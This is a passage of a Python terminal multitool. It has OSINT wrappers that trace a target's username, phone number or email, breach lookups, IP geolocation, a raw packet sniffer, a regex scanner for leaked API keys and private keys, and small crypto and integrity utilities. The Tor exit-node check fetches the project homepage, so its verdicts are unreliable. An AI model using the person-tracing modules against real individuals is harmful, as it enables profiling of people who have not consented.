            print(f"\n{Colors.GREEN}[✓] ENCRYPTED DO-H RESPONSE SYNCHRONIZED // STATUS: {status_code}{Colors.RESET}")
            print("-" * 75)
            
            answers = parsed_payload.get("Answer", [])
            if answers:
                print(f"{Colors.BOLD}{'RECORD NAME':<25}{'TYPE':<8}{'TTL':<10}{'RESOLVED DATA MAPPING VALUE'}{Colors.RESET}")
                print("-" * 75)
                for entry in answers:
                    type_id = entry.get("type", -1)
                    print(f"  {entry.get('name'):<23}{type_id:<8}{entry.get('TTL'):<10}{Colors.CYAN}{entry.get('data')}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] No DNS entries returned inside the encrypted answer payload array.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Encryption query dropped: DoH client failed to parse response: {e}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nQuery complete. Press Enter to load submenu options...")

# ================================================================================
# SUB-DIRECTORY 02 ENGINE ROUTINES (EXTERNAL OSINT CORES)
# ================================================================================

def run_sherlock_hook():
    """Invokes globally configured Sherlock profiles via system execution scripts."""
    print(f"\n{Colors.CYAN}[MODULE 01 // LIVE SYSTEM LAUNCH: SHERLOCK USERNAME TRACER]{Colors.RESET}")
    target_user = input("\nEnter target handle alias to trace: ").strip()
    if not target_user:
        return
        
    print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('sherlock')
    print(f"Running context: {executable_target} {target_user} --timeout 5\n")
    print("-" * 75)
    
    try:
        subprocess.run([executable_target, target_user, '--timeout', '5'], capture_output=False, text=True)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Environment Path Exception: System variables cannot locate the executable command.{Colors.RESET}")
        print("Resolve this by configuring your shell or executing: pipx install sherlock-project")
        
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_phoneinfoga_hook():
    """Invokes compiled PhoneInfoga infrastructure components via binary execution modules."""
    print(f"\n{Colors.CYAN}[MODULE 02 // LIVE SYSTEM LAUNCH: PHONEINFOGA TELECOM SCANNER]{Colors.RESET}")
    target_number = input("\nEnter target layout telephone with country flag code (e.g., +14155552671): ").strip()
    if not target_number:
        return
        
    print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('phoneinfoga')
    print(f"Running context: {executable_target} scan -n {target_number}\n")
    print("-" * 75)
    
    try:
        subprocess.run([executable_target, 'scan', '-n', target_number], capture_output=False, text=True)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Environment Path Exception: Local machine environment cannot see binary configuration nodes.{Colors.RESET}")
        print("Verify your workspace subfolder assets or ensure the program path is added to your environment rules.")
        
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_holehe_hook():
    """Launches Holehe email trace arrays via terminal command subprocesses."""
    print(f"\n{Colors.CYAN}[MODULE 03 // LIVE SYSTEM LAUNCH: HOLEHE EMAIL PLATFORM AUDITOR]{Colors.RESET}")
    target_mail = input("\nEnter target email address profile to trace: ").strip()
    if not target_mail or "@" not in target_mail:
        print(f"{Colors.RED}[!] Input Format Validation Error: Invalid structure format tracking input.{Colors.RESET}")
        time.sleep(1)
        return
        
    print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('holehe')
    print(f"Running context: {executable_target} {target_mail}\n")
    print("-" * 75)
    
    try:
        subprocess.run([executable_target, target_mail], capture_output=False, text=True)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Environment Path Exception: Execution link dropped due to missing package file structures.{Colors.RESET}")
        print("Deploy capabilities to your local python setup via terminal step: pip install holehe")
        
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_socialscan_hook():
    """Launches Socialscan profile cross-references concurrently across social arrays."""
    print(f"\n{Colors.CYAN}[MODULE 04 // LIVE SYSTEM LAUNCH: SOCIALSCAN CONCURRENT IDENTITY PROFILER]{Colors.RESET}")
    target_string = input("\nEnter target credential handle or mail index to cross-reference: ").strip()
    if not target_string:
        return
        
    print(f"\n{Colors.GREEN}Spawning live shell execution sandbox subprocess environment...{Colors.RESET}")
    executable_target = find_global_command('socialscan')
    print(f"Running context: {executable_target} {target_string}\n")
    print("-" * 75)
    
    try:
        subprocess.run([executable_target, target_string], capture_output=False, text=True)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Environment Path Exception: Script link trace dropped due to unprovisioned package headers.{Colors.RESET}")
        print("Provision this workspace framework layer by executing command step: pip install socialscan")
        
    print("-" * 75)
    input(f"\nSubprocess returned exit context code. Press Enter to open submenu...")

def run_live_breach_checker():
    """
    Queries open-source API telemetry registries to audit exposures.
    Leverages unauthenticated range hashes to flag leaked credentials safely.
    """
    print(f"\n{Colors.CYAN}[MODULE 05 // LIVE ONLINE DATA BREACH EXPLORER & PASSWORD LEAK CHECKER]{Colors.RESET}")
    print(" [1] Audit Email Identifier Exposure (XposedOrNot Public API)")
    print(" [2] Audit Password Exposure Anonymously (HaveIBeenPwned Range API)")
    mode = input("Select inspection target mode (1/2): ").strip()
    
    if mode == "1":
        target_email = input("\nEnter target email address to audit: ").strip()
        if not target_email or "@" not in target_email:
            print(f"{Colors.RED}[!] Format Error: Invalid email structure.{Colors.RESET}")
            time.sleep(1.2)
            return
        print(f"\n{Colors.GREEN}Querying XposedOrNot live database registry...{Colors.RESET}")
        url = f"https://xposedornot.com/api/v1/account/{target_email}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
        try:
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    raw_json = response.read().decode('utf-8')
                    parsed_data = json.loads(raw_json)
                    print(f"\n{Colors.RED}[!] EXPOSURE FOUND INSIDE INDEXED DATA LEAKS{Colors.RESET}")
                    print("-" * 75)
                    if isinstance(parsed_data, dict) and "breaches_details" in parsed_data:
                        details = parsed_data.get("breaches_details", {})
                        for breach_name in details:
                            print(f"  ➔ Exposed Source: {Colors.AMBER}{breach_name}{Colors.RESET}")
                    else:
                        print("  ➔ Record tracked inside independent credential dumps or paste files.")
        except urllib.error.HTTPError as err:
            if err.code == 404:
                print(f"\n{Colors.GREEN}[✓] STATUS SECURE: No data data breaches discovered for this email.{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}[!] API query dropped: HTTP status code {err.code}{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Connection pipeline error: {e}{Colors.RESET}")
            
    elif mode == "2":
        target_password = input("\nEnter target plaintext password to audit: ").strip()
        if not target_password:
            return
        print(f"\n{Colors.GREEN}Hashing locally and generating k-anonymity anonymous range request...{Colors.RESET}")
        sha1_hash = hashlib.sha1(target_password.encode('utf-8')).hexdigest().upper()
        prefix = sha1_hash[:5]
        suffix = sha1_hash[5:]
        
        url = f"https://api.pwnedpasswords.com/range/{prefix}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
        try:
            with urllib.request.urlopen(req, timeout=10) as response:
                lines = response.read().decode('utf-8').splitlines()
                match_count = 0
                for line in lines:
                    if ":" in line:
                        hash_suffix, count_str = line.split(":")
                        if hash_suffix == suffix:
                            match_count = int(count_str)
                            break
                print(f"\n{Colors.BOLD}PWNED PASSWORDS AUDIT REPORT:{Colors.RESET}")
                print("-" * 75)
                if match_count > 0:
                    print(f"  Analysis Verdict: {Colors.RED}[!!!] LEAKED STRONGLY EXPOSED{Colors.RESET}")
                    print(f"  Prevalence Count: This exact password string was found {Colors.RED}{match_count}{Colors.RESET} times inside data breaches.")
                    print("  Security Warning: Do not utilize this credential for active online profiles.")
                else:
                    print(f"  Analysis Verdict: {Colors.GREEN}[✓] STATUS SECURE // NO KNOWN LEAKS{Colors.RESET}")
                    print("  Prevalence Count: Zero compromised occurrences indexed.")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Failed to update Pwned Passwords threat feed: {e}{Colors.RESET}")
            
    else:
        print(f"{Colors.RED}[!] Invalid choice selected.{Colors.RESET}")
        
    print("-" * 75)
    print(f"\n{Colors.AMBER}Note on Name Queries:{Colors.RESET} Real names are omitted because public breach tracking platforms")
    print("index leaks strictly by unique identifiers (email/username) to ensure privacy and accuracy.")
    input(f"\nPress Enter to return to sub-directory menus...")

def run_threat_intel():
    """Downloads public Tor directory indices to check if an address maps to an exit node."""
    print(f"\n{Colors.CYAN}[MODULE 06 // TOR EXIT NODE THREAT INTELLIGENCE NODE VALIDATOR]{Colors.RESET}")
    target_ip = input("\nEnter target IP address to check: ").strip()
    if not target_ip:
        return
        
    print(f"\n{Colors.GREEN}Configuring safe connection stream to torproject.org public network nodes...{Colors.RESET}")
    url = "https://torproject.org"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    
    try:
        with urllib.request.urlopen(req, timeout=12) as network_stream:
            raw_text = network_stream.read().decode('utf-8')
            allocated_exit_nodes = set()
            
            for text_row in raw_text.split('\n'):
                if text_row.startswith("ExitAddress"):
                    row_elements = text_row.split()
                    if len(row_elements) > 1:
                        allocated_exit_nodes.add(row_elements[1])
                        
            print(f"\n{Colors.GREEN}[✓] VERIFIED THREAT FEED SYNCHRONIZED{Colors.RESET}")
            print("-" * 70)
            if target_ip in allocated_exit_nodes:
                print(f"Target Track IP Address: {target_ip}")
                print(f"Threat Analysis Verdict: {Colors.RED}[!!!] THREAT DETECTED // CONFIRMED TOR EXIT LAYER GATEWAY{Colors.RESET}")
            else:
                print(f"Target Track IP Address: {target_ip}")
                print(f"Threat Analysis Verdict: {Colors.GREEN}[✓] CLEAN INTERFACE ROUTE{Colors.RESET}")
    except Exception as ex:
        print(f"\n{Colors.RED}[!] Failed to capture streaming telemetry metrics from threat source: {ex}{Colors.RESET}")
        
    print("-" * 70)
    input(f"\nModule processing terminated. Press Enter to draw sub-directory menus...")

def run_ip_geolocation():
    """Queries free distributed geolocation feeds to passively discover physical positioning and provider footprints."""
    print(f"\n{Colors.CYAN}[MODULE 07 // ONLINE IP GEOLOCATION & AUTONOMOUS SYSTEM (ASN) EXPLORER]{Colors.RESET}")
    target_input = input("Enter target IP address or Domain to geolocate [Leave blank for self-lookup]: ").strip()
    
    lookup_ip = ""
    if target_input:
        try:
            socket.inet_aton(target_input)
            lookup_ip = target_input
        except Exception:
            print(f"{Colors.GREEN}Resolving domain hostname alias map natively...{Colors.RESET}")
            try:
                lookup_ip = socket.gethostbyname(target_input)
                print(f"Host bound to target endpoint coordinate: {Colors.CYAN}{lookup_ip}{Colors.RESET}")
            except Exception as e:
                print(f"\n{Colors.RED}[!] Namespace mapping lookup broken: {e}. Defaulting to explicit query format...{Colors.RESET}")
                lookup_ip = target_input

    print(f"\n{Colors.GREEN}Opening secure pipeline GET connection to ip-api.com live distributed registries...{Colors.RESET}")
    url = f"http://ip-api.com/json/{lookup_ip}"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            raw_data = response.read().decode('utf-8')
            parsed_payload = json.loads(raw_data)
            
            if parsed_payload.get("status") == "success":
                print(f"\n{Colors.GREEN}[✓] PASSIVE IP GEOLOCATION RECORD SYNCHRONIZED{Colors.RESET}")
                print("-" * 75)
                print(f"  ➔ Query Target IP : {Colors.CYAN}{parsed_payload.get('query')}{Colors.RESET}")
                print(f"  ➔ Country Region  : {parsed_payload.get('country')} ({parsed_payload.get('countryCode')})")
                print(f"  ➔ State / Province: {parsed_payload.get('regionName')}")
                print(f"  ➔ City / Locality : {parsed_payload.get('city')}")
                print(f"  ➔ Postal Zip Code : {parsed_payload.get('zip')}")
                print(f"  ➔ GPS Coordinates : Lat {parsed_payload.get('lat')}, Lon {parsed_payload.get('lon')}")
                print(f"  ➔ Local Timezone  : {parsed_payload.get('timezone')}")
                print(f"  ➔ Registered ISP  : {Colors.AMBER}{parsed_payload.get('isp')}{Colors.RESET}")
                print(f"  ➔ Autonomous Node : {Colors.AMBER}{parsed_payload.get('as')}{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}[!] Registry report flag returned exception: {parsed_payload.get('message', 'Unknown private or reserved allocation block.')}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Geolocation pipeline dropped: Communication terminal link failure: {e}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to load submenu options...")

def run_homograph_analyzer():
    """Natively audits domains for IDN homograph phishing character spoofing arrays."""
    print(f"\n{Colors.CYAN}[MODULE 08 // IDN HOMOGRAPH PHISHING DOMAIN & PUNYCODE ANALYZER]{Colors.RESET}")
    print("Translates string descriptors between Unicode and standard Punycode formats.")
    input_domain = input("\nEnter target domain to inspect (e.g., xn--appl-43d.com or apple.com): ").strip().lower()
    if not input_domain:
        return
        
    print(f"\n{Colors.GREEN}Executing encoding translation matrix checks...{Colors.RESET}")
    print("-" * 75)
    try:
        if input_domain.startswith("xn--") or ".xn--" in input_domain:
            decoded_unicode = input_domain.encode('ascii').decode('idna')
            print(f"  ➔ Input Type Format      : {Colors.AMBER}PUNYCODE (Obfuscated String Grid){Colors.RESET}")
            print(f"  ➔ Cleartext Unicode Target: {Colors.GREEN}{decoded_unicode}{Colors.RESET}")
            print(f"  ➔ Active Auditing Flag   : {Colors.RED}[!] Relief mapping indicates an international domain proxy mask.{Colors.RESET}")
        else:
            encoded_punycode = input_domain.encode('idna').decode('ascii')
            print(f"  ➔ Input Type Format      : {Colors.GREEN}STANDARD ASCII (Cleartext String Grid){Colors.RESET}")
            print(f"  ➔ Compiled Punycode Asset : {Colors.CYAN}{encoded_punycode}{Colors.RESET}")
            if encoded_punycode != input_domain:
                print(f"  ➔ Active Auditing Flag   : {Colors.RED}[!] HOMOGRAPH TARGET: Contains lookalike Unicode characters!{Colors.RESET}")
            else:
                print(f"  ➔ Active Auditing Flag   : {Colors.GREEN}[✓] CLEAN BASELINE: Native standard ASCII string configuration.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Encoding codec processing failure tracing string blocks: {e}{Colors.RESET}")
        
    print("-" * 75)
    input(f"\nAnalysis sequence finished. Press Enter to load submenu options...")

# ================================================================================
# SUB-DIRECTORY 03 ENGINE ROUTINES (LOCAL AUDITS & UTILITIES)
# ================================================================================

def run_traffic_monitor():
    """Taps directly into the machine's local socket layers using raw packet capturing flags."""
    print(f"\n{Colors.GREEN}[MODULE 01 // INBOUND NETWORK PACKET MONITOR ENGINE]{Colors.RESET}")
    print("Decodes real-time inbound packet metrics hitting your network interface adapter cards.")
    print(f"{Colors.RED}[ADMIN RISK WARNING] Raw socket intercept requires Administrator / Root rights context.{Colors.RESET}\n")
    
    if input("Initialize network socket mirroring operations pipeline? (Y/N): ").strip().upper() != 'Y':
        return

    async_dns_register = {}
    cache_lock = threading.Lock()

    def resolve_ip_async(ip_address):
        def worker_task():
            try:
                resolved_hostname, _, _ = socket.gethostbyaddr(ip_address)
                with cache_lock:
                    async_dns_register[ip_address] = resolved_hostname
            except Exception:
                with cache_lock:
                    if ip_address.startswith("192.168.") or ip_address.startswith("10.") or ip_address.startswith("172."):
                        async_dns_register[ip_address] = "Internal LAN Gateway Address"
                    elif ip_address == "127.0.0.1":
                        async_dns_register[ip_address] = "Localhost Software Loopback"
                    else:
                        async_dns_register[ip_address] = "Direct Routing Node Provider"
                        
        with cache_lock:
            if ip_address not in async_dns_register:
                async_dns_register[ip_address] = "Tracking Domain Node..."
                threading.Thread(target=worker_task, daemon=True).start()

    try:
        if os.name == "nt":
            sys_host = socket.gethostname()
            adapter_ip = socket.gethostbyname(sys_host)
            print(f"\n{Colors.GREEN}Binding raw IP network sockets pipeline to interface: {adapter_ip}{Colors.RESET}")
            
            sniffer_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sniffer_socket.bind((adapter_ip, 0))
            sniffer_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sniffer_socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        else:
            print(f"\n{Colors.GREEN}Binding generic raw socket interface frame trackers to Unix descriptors...{Colors.RESET}")
            sniffer_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
    except PermissionError:
        print(f"\n{Colors.RED}[!] Privilege Level Error: Active context has insufficient access rights.{Colors.RESET}")
        print("Rectify this by right-clicking your terminal and choosing 'Run as Administrator'.")
        input(f"\nPress Enter to break execution tracking...")
        return
    except Exception as socket_err:
        print(f"\n{Colors.RED}[!] Hardware Link dropped: Socket failure: {socket_err}{Colors.RESET}")
        input(f"\nPress Enter to break execution tracking...")
        return

    print(f"\n{Colors.CYAN}Capture Matrix online. Streaming raw traffic frames. Tap Ctrl+C to drop link...{Colors.RESET}\n")
    print(f"{Colors.BOLD}{'PROTOCOL':<12}{'SOURCE IP':<18}{'RESOLVED IDENTITY / PROV FLAG':<38}{'BUFFER LENGTH'}{Colors.RESET}")
    print("-" * 80)

    try:
        while True:
            raw_packet_bytes = sniffer_socket.recvfrom(65535)[0]
            ipv4_header_bytes = raw_packet_bytes[0:20]
            unpacked_header = struct.unpack('!BBHHHBBH4s4s', ipv4_header_bytes)
            
            protocol_flag = unpacked_header[6]
            source_address_string = socket.inet_ntoa(unpacked_header[8])
            packet_total_length = len(raw_packet_bytes)

            with cache_lock:
                identity_mapping = async_dns_register.get(source_address_string, None)

            if identity_mapping is None:
                resolve_ip_async(source_address_string)
                identity_mapping = "Resolving..."

            if len(identity_mapping) > 35:
                identity_mapping = identity_mapping[:32] + "..."

            if protocol_flag == 6:
                protocol_label, row_color = "TCP_STREAM", Colors.CYAN
            elif protocol_flag == 17:
                protocol_label, row_color = "UDP_DATAGRAM", Colors.AMBER
            elif protocol_flag == 1:
                protocol_label, row_color = "ICMP_ECHO", Colors.GREEN
            else:
                protocol_label, row_color = f"IP_PROTO-{protocol_flag}", Colors.RESET

            print(f"{row_color}{protocol_label:<12}{source_address_string:<18}{identity_mapping:<38}{packet_total_length} Bytes{Colors.RESET}")
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.AMBER}[CAPTURE DRIVER PAUSED // CLOSING SOCKET HOOK REGISTRIES]{Colors.RESET}")
        if os.name == "nt":
            try:
                sniffer_socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            except Exception:
                pass
        input(f"\nNetwork data buffer cleared. Press Enter to load utilities deck...")

def run_secret_scanner():
    """Scans local project source files using regex patterns to catch hardcoded api tokens."""
    print(f"\n{Colors.GREEN}[MODULE 02 // LOCAL DIRECTORY 'SECRET & KEY' LEAK SCANNER]{Colors.RESET}")
    target_path = input("\nEnter folder directory path path to scan [Default = current folder '.']: ").strip() or "."
    
    if not os.path.exists(target_path):
        print(f"{Colors.RED}[!] Input Target Exception: Path directory mapping unresolvable.{Colors.RESET}")
        time.sleep(1.2)
        return

    print(f"\n{Colors.GREEN}Analyzing source data text streams. Filtering compiled binary blocks...{Colors.RESET}\n")
    regex_signature_dictionary = {
        "Google Cloud Access API Key": re.compile(r'AIza[0-9A-Za-z-_]{35}'),
        "Generic Assignment Security Hash": re.compile(r'(?i)(api_key|secret_key|password|private_key)\s*[:=]\s*["\'][0-9a-zA-Z-_]{16,64}["\']'),
        "Private Cryptographic Key Header": re.compile(r'-----BEGIN (RSA|EC|DSA|OPENSSH)? PRIVATE KEY-----'),
        "AWS Cloud Identity Allocation Token Structure": re.compile(r'AKIA[0-9A-Z]{16}')
    }

    discovered_leaks_counter = 0
    ignored_file_extensions = ('.exe', '.dll', '.png', '.jpg', '.jpeg', '.gif', '.zip', '.tar', '.gz', '.pdf', '.mp4', '.pyc')
    ignored_directory_trees = ('.git', '__pycache__', 'venv', '.local', 'node_modules')

    for root, directories, filenames in os.walk(target_path):
        directories[:] = [d for d in directories if d not in ignored_directory_trees]
        for filename in filenames:
            if filename.endswith(ignored_file_extensions):
                continue
            absolute_file_path = os.path.join(root, filename)
            try:
                with open(absolute_file_path, 'r', encoding='utf-8', errors='ignore') as file_reader:
                    for sequence_line_num, cleartext_row in enumerate(file_reader, 1):
                        for signature_label, validation_regex in regex_signature_dictionary.items():
                            regex_match = validation_regex.search(cleartext_row)
                            if regex_match:
                                discovered_leaks_counter += 1
                                captured_raw_string = regex_match.group(0)
                                obfuscated_value = captured_raw_string[:8] + "..." + captured_raw_string[-4:] if len(captured_raw_string) > 12 else "********"
                                print(f"{Colors.RED}[ RISK LEAK DETECTED ]{Colors.RESET} File: {filename} | Line: {sequence_line_num} | Flag: {signature_label} -> {Colors.AMBER}{obfuscated_value}{Colors.RESET}")
            except Exception:
                pass

    print("\n" + "-" * 70)
    print(f"Directory audit finalized. Total exposed storage indicators flagged: {Colors.RED}{discovered_leaks_counter}{Colors.RESET}")
    input(f"\nPress Enter to reset terminal menu systems interface...")

def run_hash_matrix():
    """Generates localized cryptographic hashes or determines algorithm types based on bit lengths."""
    print(f"\n{Colors.GREEN}[MODULE 03 // CRYPTOGRAPHIC HASH SIGNATURE GENERATOR & ANALYZER]{Colors.RESET}")
    print(" [1] Process Text String into Cryptographic Signatures (Checksums)")
    print(" [2] Profile Unknown Hash Formats using Bit-Length Constraints")
    menu_choice = input("Select operation mode target (1/2): ").strip()

    if menu_choice == "1":
        plaintext_input_bytes = input("\nEnter text string to convert: ").encode('utf-8')
        print(f"\n{Colors.BOLD}COMPUTED HASH METRICS:{Colors.RESET}")
        print(f"  MD5 Checksum Payload    : {Colors.CYAN}{hashlib.md5(plaintext_input_bytes).hexdigest()}{Colors.RESET}")
        print(f"  SHA-1 Signature Payload : {Colors.AMBER}{hashlib.sha1(plaintext_input_bytes).hexdigest()}{Colors.RESET}")
        print(f"  SHA-256 Core Checksum   : {Colors.GREEN}{hashlib.sha256(plaintext_input_bytes).hexdigest()}{Colors.RESET}")
    elif menu_choice == "2":
        raw_signature_hash = input("\nEnter unknown hash signature string to verify: ").strip().lower()
        purified_hash_string = "".join(char for char in raw_signature_hash if char.isalnum())
        character_length_metric = len(purified_hash_string)
        
        print(f"\n{Colors.BOLD}TELEMETRY STRUCTURE ANALYSIS REPORT:{Colors.RESET}")
        print(f"  Captured Character Bit-Length: {character_length_metric}")
        
        if character_length_metric == 32:
            print(f"  Isolated Target Type Matrix  : {Colors.CYAN}MD5 Message Digest (128-bit Signature){Colors.RESET}")
        elif character_length_metric == 40:
            print(f"  Isolated Target Type Matrix  : {Colors.AMBER}SHA-1 Secure Algorithm (160-bit Signature){Colors.RESET}")
        elif character_length_metric == 64:
            print(f"  Isolated Target Type Matrix  : {Colors.GREEN}SHA-256 Standard Structure (256-bit Signature){Colors.RESET}")
        else:
            print(f"  Isolated Target Type Matrix  : {Colors.RED}Custom, Compressed, or Multi-Layered Format Hash{Colors.RESET}")
    else:
        print(f"{Colors.RED}[!] Operations Flag Error: Provided variable context is unresolvable.{Colors.RESET}")
        
    print("-" * 70)
    input(f"\nPress Enter to reload menu directory layers...")

def run_system_profiler():
    """Gathers machine hardware data and environment tracking information natively."""
    print(f"\n{Colors.GREEN}[MODULE 04 // ADVANCED HOST SYSTEM TELEMETRY PROFILER]{Colors.RESET}")
    print("Extracting environment tracking attributes and kernel parameters...\n")
    time.sleep(0.5)

    print(f"{Colors.BOLD}OS CORE METRICS:{Colors.RESET}")
    print(f"  Primary OS Layer Name : {platform.system()}")
    print(f"  Release Build Model   : {platform.release()}")
    print(f"  Kernel Version Build  : {platform.version()}")
    print(f"  Platform Architecture : {platform.machine()}")
    print(f"  Processor Core Asset  : {platform.processor()}")
    
    print(f"\n{Colors.BOLD}NETWORK INTERFACE HARDWARE PROFILE:{Colors.RESET}")
    try:
        network_host_identifier = socket.gethostname()
        primary_interface_ip = socket.gethostbyname(network_host_identifier)
        print(f"  Console Hostname Tag : {network_host_identifier}")
        print(f"  Primary Interface IP : {primary_interface_ip}")
    except Exception as telemetry_error:
        print(f"  Failed to capture hardware device descriptors: {telemetry_error}")

    print("-" * 70)
    input(f"\nTelemetry collection phase finished. Press Enter to load submenu options...")

def run_base64_matrix():
    """Processes plaintext variables natively into standardized Base64 output arrays."""
    print(f"\n{Colors.GREEN}[MODULE 05 // BASE64 DATA PARSING & CODEC MATRIX]{Colors.RESET}")
    print(" [E] Encode Cleartext Variables into Standard Base64 String Format")
    print(" [D] Decode Base64 Obfuscated Format Arrays into Cleartext Strings")
    operational_flag = input("Select processing configuration flag (E/D): ").strip().upper()
    
    if operational_flag == 'E':
        cleartext_string_input = input("\nEnter raw text data string to transform: ")
        converted_base64_bytes = base64.b64encode(cleartext_string_input.encode('utf-8'))
        print(f"\n{Colors.GREEN}Transformation Complete Payload String:{Colors.RESET}")
        print(f"{Colors.BOLD}{converted_base64_bytes.decode('utf-8')}{Colors.RESET}")
    elif operational_flag == 'D':
        obfuscated_base64_input = input("\nEnter base64 formatted code array string to translate: ")
        try:
            translated_cleartext_bytes = base64.b64decode(obfuscated_base64_input.encode('utf-8'))
            print(f"\n{Colors.GREEN}De-obfuscated Restored Cleartext Data String:{Colors.RESET}")
            print(f"{Colors.BOLD}{translated_cleartext_bytes.decode('utf-8')}{Colors.RESET}")
        except Exception as payload_error:
            print(f"\n{Colors.RED}[!] Formatting Failure: Sequence is not a standard Base64 structure: {payload_error}{Colors.RESET}")
    else:
        print(f"{Colors.RED}[!] Operations Flag Error: Provided variable context is unresolvable.{Colors.RESET}")
        
    print("-" * 70)
    input(f"\nPress Enter to reset active console workspace...")

# ================================================================================
# SUB-DIRECTORY 04 ENGINE ROUTINES (INTEGRITY & CORE COMPLIANCE SCANS)
# ================================================================================

def run_file_integrity_monitor():
    """Tracks filesystem state drift over time by capturing localized baseline hash registries."""
    print(f"\n{Colors.GREEN}[MODULE 01 // LOCAL FILE INTEGRITY MONITOR (FIMS)]{Colors.RESET}")
    target_dir = input("\nEnter target folder directory path to snapshot [Default = '.']: ").strip() or "."
    
    if not os.path.exists(target_dir):
        print(f"{Colors.RED}[!] Error: Target filesystem path unresolvable.{Colors.RESET}")
        time.sleep(1.2)
        return
        
    manifest_file = "fims_manifest.json"
    current_hashes = {}
    
    print(f"\n{Colors.GREEN}Hashing directory structures concurrently...{Colors.RESET}")
    for root, _, filenames in os.walk(target_dir):
        for filename in filenames:
            absolute_path = os.path.join(root, filename)
            try:
                sha_hasher = hashlib.sha256()
                with open(absolute_path, 'rb') as f:
                    for buffer_chunk in iter(lambda: f.read(4096), b''):
                        sha_hasher.update(buffer_chunk)
                current_hashes[absolute_path] = sha_hasher.hexdigest()
            except Exception:
                pass
                
    if not os.path.exists(manifest_file):
        try:
            with open(manifest_file, 'w', encoding='utf-8') as f:
                json.dump(current_hashes, f, indent=4)
            print(f"\n{Colors.GREEN}[✓] BASELINE DATABASE COMPILED ({len(current_hashes)} FILES INDEXED){Colors.RESET}")
        except Exception as err:
            print(f"{Colors.RED}[!] Database export failure: {err}{Colors.RESET}")
    else:
        print(f"{Colors.AMBER}[!] Found existing baseline. Cross-referencing folder metadata changes...{Colors.RESET}\n")
        try:
            with open(manifest_file, 'r', encoding='utf-8') as f:
                baseline_hashes = json.load(f)
                
            added_files = [p for p in current_hashes if p not in baseline_hashes]
            deleted_files = [p for p in baseline_hashes if p not in current_hashes]
            modified_files = [p for p in current_hashes if p in baseline_hashes and current_hashes[p] != baseline_hashes[p]]
            
            print(f"{Colors.BOLD}INTEGRITY SCAN REPORT:{Colors.RESET}")
            print("-" * 75)
            print(f"  Active Monitored Items : {len(current_hashes)}")
            print(f"  Untracked New Additions: {Colors.AMBER}{len(added_files)}{Colors.RESET}")
            print(f"  Missing Deleted Items  : {Colors.RED}{len(deleted_files)}{Colors.RESET}")
            print(f"  Modified Data Signatures: {Colors.RED}{len(modified_files)}{Colors.RESET}")
            print("-" * 75)
            
            for p in added_files: print(f"  {Colors.GREEN}[NEW FILE]{Colors.RESET} {p}")
            for p in deleted_files: print(f"  {Colors.RED}[DELETED]{Colors.RESET} {p}")
            for p in modified_files: print(f"  {Colors.RED}[MODIFIED]{Colors.RESET} {p}")
            
            sync_permission = input("\nOverwrite baseline manifest database with current state mapping? (Y/N): ").strip().upper()
            if sync_permission == 'Y':
                with open(manifest_file, 'w', encoding='utf-8') as f:
                    json.dump(current_hashes, f, indent=4)
                print(f"{Colors.GREEN}[✓] Snapshot database registry synchronized.{Colors.RESET}")
        except Exception as sync_err:
            print(f"{Colors.RED}[!] Failed to complete workspace integrity comparison: {sync_err}{Colors.RESET}")
            
    print("-" * 75)
    input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")

def run_ssl_auditor():
    """Connects to server ports using standard ssl libraries to inspect peer certificate states and expiration vectors."""
    import ssl
    print(f"\n{Colors.GREEN}[MODULE 02 // SSL/TLS CERTIFICATE & CIPHER SUITE AUDITOR]{Colors.RESET}")
    target_host = input("\nEnter target host machine domain string (e.g., encrypted.com): ").strip()
    if not target_host:
        return
        
    port = 443
    print(f"\n{Colors.GREEN}Initiating production TLS connection handshake stream...{Colors.RESET}")
    try:
        ssl_context = ssl.create_default_context()
        base_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        base_socket.settimeout(4.5)
        
        secure_socket = ssl_context.wrap_socket(base_socket, server_hostname=target_host)
        secure_socket.connect((target_host, port))
        
        negotiated_cipher = secure_socket.cipher()
        peer_certificate = secure_socket.getpeercert()
        secure_socket.close()
        
        print(f"\n{Colors.GREEN}[✓] TELEMETRY DISCOVERED // SUCCESSFUL SECURE DISCOVERY HANDSHAKE{Colors.RESET}")
        print("-" * 75)
